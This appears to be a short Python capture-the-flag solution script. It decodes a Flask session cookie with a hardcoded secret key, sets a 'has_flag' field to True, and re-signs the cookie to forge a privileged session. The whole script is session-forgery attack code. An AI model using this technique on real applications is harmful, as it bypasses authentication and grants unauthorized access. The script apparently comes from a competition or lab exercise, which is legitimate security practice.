#!/usr/bin/env python

from cookie_decode import *

secret = '\xd2zX\xe6|S\x90\xc3xi\x88l\x18\xe6zP'
cookie = "eyJoYXNfZmxhZyI6ZmFsc2V9.XKnI9A.vNOsL9z4Zc1QwuRbeQjrxKd9UyA"
session = decodeFlaskCookie(secret, cookie)
print 'Decoded original cookie:', session

session['has_flag'] = True
cookie = encodeFlaskCookie(secret, session)
print 'Decoded new cookie:', decodeFlaskCookie(secret, cookie)
print 'New cookie:', cookie
